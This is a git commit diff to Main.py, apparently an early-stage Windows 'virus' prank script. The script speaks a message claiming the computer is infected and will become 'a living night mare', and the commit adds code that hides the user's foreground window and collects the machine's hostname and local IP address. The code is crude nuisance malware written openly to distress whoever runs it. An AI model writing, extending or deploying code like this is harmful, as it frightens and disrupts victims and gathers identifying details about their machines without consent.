4d5941c956e25cb64347e9a82d8b7de5fa325e97
DJchicken899 <laceywilley@gmail.com>
2025-05-11 17:28:54 -0700

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,10 +1,14 @@
 import pyttsx3 as tts
 import time
 import ctypes
-
+import win32gui
+import win32con
+import socket
 
 engine =  tts.init()
 engine.say("Hello, your computer has been infected with a virus that will make your computer a living night mare, have fun with this") # living heel as in not blue screen but just as annoything as possible
 engine.runAndWait()
-
-
+hwnd = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+pcname = socket.gethostname()
+ip = socket.gethostbyname(pcname)
